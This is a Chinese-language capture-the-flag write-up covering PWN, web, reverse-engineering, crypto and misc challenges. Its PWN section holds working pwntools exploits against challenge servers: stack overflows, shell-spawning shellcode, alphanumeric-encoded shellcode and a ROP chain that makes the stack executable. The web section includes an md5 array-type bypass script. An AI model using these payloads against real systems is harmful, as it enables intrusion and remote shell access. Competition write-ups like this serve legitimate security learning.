[TOC]
# PWN
## easyoverflow
简单栈溢出exp.py
```
#coding:utf8
from pwn import *

#sh = process('./easy_overflow')

sh = remote('38.39.244.2',28085)

payload = 'a'*0x30 + 'n0t_r3@11y_f1@g'

sh.sendline(payload)

sh.interactive()

```
## shellcode
直接用pwntools自带的shellcode
```
#coding:utf8
from pwn import *

#sh = process('./shellcode')
sh = remote('38.39.244.2',28068)
sh.sendline(asm(shellcraft.amd64.linux.sh(),arch='amd64'))

sh.interactive()
```
## Easy_equation
直接覆盖返回地址
```
#coding:utf8
from pwn import *

#sh = process('./easy_equation')
sh = remote('38.39.244.2',28066)
payload = 'a'*9 + p64(0x4006D0)

sh.sendline(payload)

sh.interactive()

```
## shellcode Revenge
限制字符范围为ascii可见字符，我们可以用谷歌的ALPHA3工具加密shellcode为存ascii字符shellcode即可。
```
#coding:utf8
from pwn import *

#sh = process('./shellcode-revenge')

sh = remote('38.39.244.2',28020)
payload = 'Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t'

sh.send(payload)

sh.interactive()
```
## nothing_but_everything
去掉了符号，我们可以写一个简易的程序静态编译后与该二进制进行对比，推断出某些函数的地址。我们找到_dl_make_stack_executable函数后，调用它，让栈变得可执行，然后jmp rsp执行shellcode。
```
#coding:utf8
from pwn import *

#sh = process('./nothing_but_everything')

#context.log_level = 'debug'
sh = remote('38.39.244.2',28089)
jmp_rsp = 0x0000000000494467
#mov qword ptr [rax], rdx ; xor eax, eax ; ret
mov_p_rax_rdx = 0x0000000000471c1a

pop_rax = 0x00000000004494ac
pop_rdx = 0x0000000000449505
pop_rdi = 0x0000000000400686

_dl_make_stack_executable = 0x000000000047FB30
__stack_prot = 0x00000000006B8EF0
stack_end_ptr = 0x00000000006B8AB0
sh.sendline('haivk')

sleep(0.5)

payload = 'a'*0x78 + p64(pop_rax) + p64(__stack_prot) + p64(pop_rdx) + p64(0x1000007) + p64(mov_p_rax_rdx)
payload += p64(pop_rdi) + p64(stack_end_ptr) + p64(_dl_make_stack_executable) + p64(jmp_rsp) +asm(shellcraft.amd64.linux.sh(),arch='amd64')
#raw_input()
#payload = 'a'*0x78 + p64(0x400B4D)
sh.sendline(payload)

sh.interactive()
```
# web
## ez_bypass
利用数组类型，使得md5返回null，绕过。ez_bypass.py
```
#coding:utf-8
import urllib  
import urllib2
import cookielib

cookie = cookielib.CookieJar()  
opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cookie))
headers = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36'}
postdata= urllib.urlencode({'passwd':'1234567a'})
req = urllib2.Request(url = 'http://b4c6914c-bdc0-48af-b6eb-5a51b9b3686c.merak-ctf.site/?id[]=aaa&gg[]=bbb',headers=headers,data=postdata)
#访问该链接#
result = opener.open(req)
#打印返回的内容#
a=result.read() 
print a
```
# RE
## Transform
```
#include <stdio.h>
#include <stdlib.h>


int dword_40F040[40];
char byte_40F0E0[96];

void initArr() {
	FILE *f = fopen("Transform.exe","rb");
	fseek(f,0xDC40,0);
	fread(dword_40F040,4,40,f);
	fseek(f,0xDCE0,0);
	fread(byte_40F0E0,1,96,f);
	fclose(f);
}
int main() {
	char flag[33] = {0};
	initArr();
	for (int i=0;i<33;i++) {
		int x = dword_40F040[i];
		flag[x] = byte_40F0E0[i] ^ (char)x;
	}
	printf("%s\n",flag);
	return 0;
}
```
## 撸啊撸
```
#include <iostream>

using namespace std;

int data[] = {83,80,73,80,76,125,61,96,107,85,62,63,121,122,101,33,123,82,101,114,54,100,101,97,85,111,39,97};

int main() {
	string ans = "";
	for (int i=0;i<28;i++) {
		int j = i + 1;
		if (j % 2) {
			ans.insert(ans.end(),data[i]-6);
		} else {
			ans.insert(ans.end(),data[i] ^ j);
		}
	}
	cout << ans << endl;
	return 0;
}
```
## PixelShooter
直接用CSharpDecompile查看Assembly-CSharp.dll文件，即可发现flag。
## hello_world_go
直接用IDA打开，执行golang_loader_assist.py脚本，即可恢复符号，然后可以再查看一下主函数，可以发现flag。
##Junk
逆向出逻辑如下
```
#include <iostream>
#include <cstring>

using namespace std;

#define rol( a , o ) \
	((a<<(o%0x8)) | (a>>(0x8- (o%0x8))))
#define ror( a , o ) \
	((a>>(o%0x8)) | (a<<(0x8 - (o%0x8))))

char password_table[100] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz)!@#$%^&*(+/";
int main() {
	char flag[0x2C] = "MRCTF{34567890}abcdefghmnbvcxzasdfghjkloiu";
	for (int i=0; i<0x2B; i++) {
		flag[i] ^= 0x3;
		if (flag[i])
			flag[i] = ror(flag[i],4);
		else
			flag[i] = rol(flag[i],4);
	}
	
    for (int i=0;i<0x2C;i++) {
		cout << hex << (int)flag[i] << endl;
	}
	
	int len = strlen(flag);
	cout << "len=" << len << endl;
	char ans[0x100] = {0};
	unsigned char *buf = (unsigned char *)flag;
	int i,j;
	for (i=0,j=0; i<len+12; i+=4,j+=3) {
		ans[i] = password_table[buf[j] >> 2];
		ans[i+1] = password_table[(unsigned char)((buf[j+1] >> 4) + 16 * (buf[j] & 3))];
		ans[i+2] = password_table[(buf[j+2] >> 6) + 4 * (buf[j+1] & 0xF)];
		ans[i+3] = password_table[buf[j+2] & 0x3F];
	}
	ans[i] = 'M';
	ans[i+1] = 'w';
	ans[i+2] = '.';
	ans[i+3] = '.';
	cout << ans << endl;
    
	return 0;
}
```
写出逆向算法
```
#include <iostream>
#include <cstring>
#include <stdint.h>

using namespace std;

#define rol( a , o ) \
	((a<<(o%0x8)) | (a>>(0x8- (o%0x8))))
#define ror( a , o ) \
	((a>>(o%0x8)) | (a<<(0x8 - (o%0x8))))

char password_table[100] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz)!@#$%^&*(+/";

char chiper[] = "%BUEdVSHlmfWhpZn!oaWZ(aGBsZ@ZpZn!oaWZ(aGBsZ@ZpZn!oYGxnZm";

int findOffset(char c) {
	for (int i=0; i<64; i++) {
		if (c == password_table[i]) {
			return i;
		}
	}
	return -1;
}

bool judge(unsigned char *buf,int i,int j) {
	return chiper[i] == password_table[buf[j] >> 2] &&
	       chiper[i+1] == password_table[(unsigned char)((buf[j+1] >> 4) + 16 * (buf[j] & 3))] &&
	       chiper[i+2] == password_table[(buf[j+2] >> 6) + 4 * (buf[j+1] & 0xF)] &&
	       chiper[i+3] == password_table[buf[j+2] & 0x3F];
}
int main() {
	int i,j;
	unsigned char buf[0x2C] = {0};
	for (i=0,j=0; i<0x2B+12; i+=4,j+=3) {
		uint8_t tmp = findOffset(chiper[i]);
		buf[j] = tmp << 2;

		//cout << hex << (int)buf[j] << endl;
		tmp = findOffset(chiper[i+1]);
		buf[j+1] = (tmp - 16 * (buf[j] & 3)) << 4;

		//cout << hex << (int)buf[j+1] << endl;
		tmp =  findOffset(chiper[i+2]);
		buf[j+2] = (tmp - 4 * (buf[j+1] & 0xF)) << 6;

		int start_a = buf[j];
		int start_b = buf[j+1];
		int start_c = buf[j+2];
		//У׼ƫ²
		for (int a=start_a; a<start_a+0x4; a++) {
			for (int b=start_b; b<start_b+0x10; b++) {
				for (int c=start_c; c<start_c+64; c++) {
					buf[j] = a;
					buf[j+1] = b;
					buf[j+2] = c;
					if (judge(buf,i,j)) {
						goto ok;
					}
				}
			}
		}
ok:
		continue;
	}
	//cout << buf << endl;
/*	for (int i=0;i<0x2C;i++) {
		cout << hex << (int)buf[i] << endl;
	}*/
	char flag[0x2C] = {0};
	for (int i=0; i<0x2B; i++) {
	   flag[i] = rol(buf[i],4);
	   flag[i] ^= 0x3;
	}
	cout << flag << endl;
	return 0;
}
```
## Hard-to-go
还是先用golang_loader_assist.py脚本恢复符号，然后分析，发现是rc4加密，写出逆向算法。
```
from Crypto.Cipher import ARC4


def decodeRC4(data,key):
	rc41 = ARC4.new(key)
	decrypted = rc41.decrypt(data)
	return decrypted
	
data = '\x7D\x30\x6E\xC9\xCC\x03\x93\x1E\x85\x4D\x45\x5F\xC5\x46\xF4\xA8\xA0\x3E\x11\xBE\x70\x75\x1D\xA3\xCD\x7F\xFF\xBD\x81\x12\x00'
print decodeRC4(data,'MRCTF_GOGOGO')
```
## Shit
用IDA调试时发现一直运行，后来把initterm给nop掉，可以调试了，写好逆向算法后发现结果不对。原来key值跟是否调试有关，发现ollydbg可以直接调试，不会被检测到，于是利用ollydbg，获得key的数据，然后写出逆向算法。
加密逻辑
```
#include <iostream>

using namespace std;

int key[] = {0x3,0x10,0xD,0x4,0x13,0xB};

int chiper[] = {0x8C2C133A,0xF74CB3F6,0xFEDFA6F2,0xAB293E3B,0x26CF8A2A,0x88A1F279};

int prev = 0;
int main() {
	char flag[0x19] = "MRCTFaaaaaaaaaaaaaaaaaaa";
	for (int i=0;i<0x18;i+=4) {
		int c1 = flag[i];
		c1 <<= 0x18;
		int c2 = flag[i+1];
		c2 <<= 0x10;
		c1 |= c2;
		int c3 = flag[i+2];
		c3 <<= 0x8;
		c1 |= c3;
		int c4 = flag[i+3];
		c1 |= c4;
		//
		unsigned int x1 = c1;
		int k = key[i / 4];
		x1 = x1 >> k;
		//cout << hex << x1 << endl;
		int k2 = 0x20 - k;
		
		//cout << hex << k2 << endl;
		int x2 = c1;
		x2 <<= k2;
		//cout << hex << x2 << endl;
		x1 |= x2;
		
		//x1 = 0xecd58c2c;
		//cout << hex << x1 << endl;
		unsigned int x3 = x1;
		x3 >>= 0x10;
		//cout << hex << x3 << endl;
		x3 = ~x3;
		//cout << hex << x3 << endl;
		x3 &= 0xFFFF;
		//cout << hex << x3 << endl;
		unsigned int x4 = x1;
		x4 <<= 0x10;
		//cout << hex << x4 << endl;
		x3 |= x4;
		//cout << hex << x3 << endl;
		
		int x5 = 1;
		x5 <<= k;
		//cout << hex << x5 << endl;
		x5 ^= x3;
		
		cout << hex << x5 << endl;
		
		x5 ^= prev;
		prev = x5;
		
		cout << hex << x5 << endl;
		if (x5 == chiper[i / 4]) {
			cout << "correct" << endl;
			continue;
		} else {
			cout << "error!" << endl;
			break;
		}
		break;
	}
	return 0;
}
```
写出逆向算法
```
#include <iostream>
#include <cmath>

using namespace std;

int key[] = {0x3,0x10,0xD,0x4,0x13,0xB};

int chiper[] = {0x8C2C133A,0xF74CB3F6,0xFEDFA6F2,0xAB293E3B,0x26CF8A2A,0x88A1F279};

int prev = 0;

#define rol( a , o ) \
	((a<<(o%0x20)) | (a>>(0x20- (o%0x20))))
#define ror( a , o ) \
	((a>>(o%0x20)) | (a<<(0x20 - (o%0x20))))
	
int main() {
	for (int i=0;i<6;i++) {
		int c = chiper[i];
		int k = key[i];
		c ^= prev;
		prev = chiper[i];
		int x5 = 1 << k;
		int x3 = x5 ^ c;
		//cout << hex << x3 << endl;
		int x1_low = (x3 >> 0x10) & 0xFFFF;
		int x1_high = ~(x3 & 0xFFFF);
		unsigned int x1 = x1_low + (x1_high << 0x10);
		//cout << hex << x1 << endl;
		int password = rol(x1,k);
		//cout << hex << password << endl;
		string str = "";
		while (password > 0) {
		   char ch = password & 0xFF;
		   string s(&ch,1);
		   str = s + str;
		   password >>= 8;
		}
		cout << str;
	}
	cout << endl;
	return 0;
}
```
## EasyCpp
```
#include <iostream>
#include <cmath>
#include <cstring>
#include <cstdlib>

using namespace std;

string chipers[] = {"zqE=z=z=z","=lzzE","=ll=T=s=s=E","=zATT","=s=s=s=E=E=E","=EOll=E","=lE=T=E=E=E","=EsE=s=z","=AT=lE=ll"};

void depart(int a1) {
	int v6 = a1;
	for (int i = 2; sqrt((unsigned int)a1) >= (double)i; ++i ) {
		if ( !(a1 % i) ) {
			v6 = i;
			depart(a1 / i);
			break;
		}
	}
	cout << v6 << endl;
}

int main() {
	for (int k=0; k<9; k++) {
		string chiper = chipers[k];
		for (int i=0; i<chiper.size(); i++) {
			char c;
			switch (chiper[i]) {
				case 'O':
					c = '0';
					break;
				case 'l':
					c = '1';
					break;
				case 'z':
					c = '2';
					break;
				case 'E':
					c = '3';
					break;
				case 'A':
					c = '4';
					break;
				case 's':
					c = '5';
					break;
				case 'G':
					c = '6';
					break;
				case 'T':
					c = '7';
					break;
				case 'B':
					c = '8';
					break;
				case 'q':
					c = '9';
					break;
				case '=':
					c = ' ';
					break;
			}
			chiper[i] = c;
		}
		//cout << chiper << endl;
		char * cstr = new char [chiper.length()+1];
		strcpy (cstr, chiper.c_str());
		char * p = strtok (cstr," ");
		int sum = 1;
		while (p!=0) {
			int x = atoi(p);
			if (x == 0) {
				break;
			}
			sum *= x;
			p = strtok(NULL," ");
		}
		cout << (sum ^ 1) << " ";
		delete[] cstr;
	}
	cout << endl;
	return 0;
}
```
# Crypto
## 天干地支+甲子
对照天干地支表对应的数字与一个甲子(60)相加，得到数值，转成ascii即可。
## Keyboard
9宫格键盘，对应的数字代表对应的按键，数字次数代表字母的位置。
# Misc
## 千层套路
套了1千个压缩包，用python解压
```
import zipfile
import sys


def extractA(path):
   zipfiles = zipfile.ZipFile(path, "r")
   names = zipfiles.namelist();
   if len(names) == 1 and '.zip' in names[0]:
      name = names[0]
      print name
      zipfiles.extract(name,path='./',pwd=path[0:4].encode("ascii"))
      zipfiles.close()
      extractA(name)
   else:
      print 'done'
extractA('0573.zip')
```
得到一个txt文件，里面是rgb值，画成图片
```
import re
from PIL import Image

f = open('qr.txt','r')
content = f.read()
f.close()
content = content.split('\n')

img = Image.new("RGB",(200,200))
i = 0
j = 0
for line in content:
   if i == 200:
      break
   rgb = re.findall(r"\((.*?), (.*?), (.*?)\)",line)[0]
   img.putpixel((i,j),(int(rgb[0]),int(rgb[1]),int(rgb[2])))
   j += 1
   if j == 200:
      i += 1
      j = 0
img.save("qr.png")
```
得到二维码，扫描即可。
## CyberPunk
用UPXEasyGUI工具一键脱壳，然后用IDA查看exe文件，得到flag。
## Ezmisc
用十六进制编辑器修改图片高度，打开图片，出现flag。
## 你能看懂音符吗
压缩包头文件有问题，用十六进制编辑器把头aRr改成Rar，然后解压，得到一个word文档，打开后发现没有内容，打开word的设置，勾选隐藏内容，出现音符，复制音符，使用在线音符解密，得到flag。
